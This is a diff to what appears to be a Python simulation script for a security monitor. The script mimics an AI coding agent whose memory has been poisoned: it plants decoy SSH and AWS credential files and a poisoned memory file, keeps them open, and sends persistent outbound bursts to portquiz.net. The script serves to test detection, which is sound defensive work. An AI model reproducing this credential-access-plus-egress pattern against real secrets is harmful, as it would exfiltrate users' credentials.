@@ -41,8 +41,8 @@ PID_FILE = "memory_poisoning.pid"
 CREATED_MARKER = "memory_poisoning.created"
 
 DEFAULT_TARGET_HOST = "portquiz.net"
-DEFAULT_TARGET_PORT = 31337
-DEFAULT_PAYLOAD_BYTES = 2048
+DEFAULT_TARGET_PORT = 63169
+DEFAULT_PAYLOAD_BYTES = 4096
 
 POISONED_MEMORY_CONTENT = """\
 # Agent Memory (POISONED)
@@ -70,12 +70,12 @@ def parse_args() -> argparse.Namespace:
                     "credential + poisoned-memory access with undeclared egress."
     )
     p.add_argument("--agent-type", default=None,
-                   help="Agent type: openclaw|cursor|claude_code (default: openclaw or EDAMAME_AGENT_TYPE)")
+                   help="Agent type: openclaw|cursor|claude_code|claude_desktop (default: openclaw or EDAMAME_AGENT_TYPE)")
     p.add_argument("--target-host", default=DEFAULT_TARGET_HOST)
     p.add_argument("--target-ip", default="",
                    help="Pre-resolved IP; skips DNS if set")
     p.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT)
-    p.add_argument("--interval", type=float, default=0.3,
+    p.add_argument("--interval", type=float, default=0.2,
                    help="Seconds between outbound bursts")
     p.add_argument("--duration", type=float, default=0.0,
                    help="Runtime limit in seconds; 0 = until interrupted")
@@ -155,6 +155,11 @@ def main() -> int:
         f"{upfx}_MEMORY_POISONING_PAYLOAD\n",
         state_dir,
     )
+    aws_cred = ensure_demo_sensitive_file(
+        Path(f"~/.aws/{pfx}_memory_poison_credentials"),
+        f"[default]\naws_access_key_id = AKIA{upfx}_MEM\naws_secret_access_key = {pfx}_memory_poison_secret\n",
+        state_dir,
+    )
 
     signal.signal(signal.SIGINT, handle_signal)
     signal.signal(signal.SIGTERM, handle_signal)
@@ -162,7 +167,7 @@ def main() -> int:
     pid_file = state_dir / PID_FILE
     pid_file.write_text(f"{os.getpid()}\n", encoding="utf-8")
 
-    open_paths = [ssh_key, memory_file]
+    open_paths = [ssh_key, aws_cred, memory_file]
     psk_path = Path("~/.edamame_psk").expanduser()
     if psk_path.exists():
         open_paths.append(psk_path)
@@ -195,7 +200,8 @@ def main() -> int:
                     sock = socket.create_connection(
                         (target_ip, args.target_port), timeout=10.0
                     )
-                    sock.settimeout(10.0)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                    sock.settimeout(30.0)
                 except OSError:
                     time.sleep(min(interval, 1.0))
                     continue
@@ -210,6 +216,19 @@ def main() -> int:
                 sock = None
                 time.sleep(min(interval, 0.5))
                 continue
+
+            # Drain any echoed data so the socket stays open and anomalous longer.
+            try:
+                sock.setblocking(False)
+                try:
+                    sock.recv(65536)
+                except (BlockingIOError, OSError):
+                    pass
+                finally:
+                    sock.setblocking(True)
+                    sock.settimeout(30.0)
+            except OSError:
+                pass
 
             time.sleep(interval)
     finally:
